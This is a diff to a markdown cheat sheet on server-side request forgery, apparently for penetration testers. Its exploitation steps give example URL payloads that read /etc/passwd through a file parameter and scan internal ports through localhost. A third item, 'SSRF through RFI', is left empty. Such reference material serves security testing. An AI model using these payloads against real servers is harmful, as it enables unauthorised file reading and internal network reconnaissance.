@@ -28,6 +28,8 @@ Example: `http://example.com/profile/php?uri=http://externalwebsite.com `
 
 ## Exploitation
 
-1. Read file from the server: `http://example.com/profile?file=file:///../etc/passwd` (here *../etc/passwd* is payload. replace with other payload)
+1. Read file from the server: `http://example.com/profile?file=file:///../etc/passwd` (here **../etc/passwd** is payload. replace with other payload)
 
-2. Scan Internal network: ``
+2. Scan internal network open ports: `http://example.com/profile?file=http://localhost:21` (here **21** is port. change one by one)
+
+3. SSRF through RFI: `` 
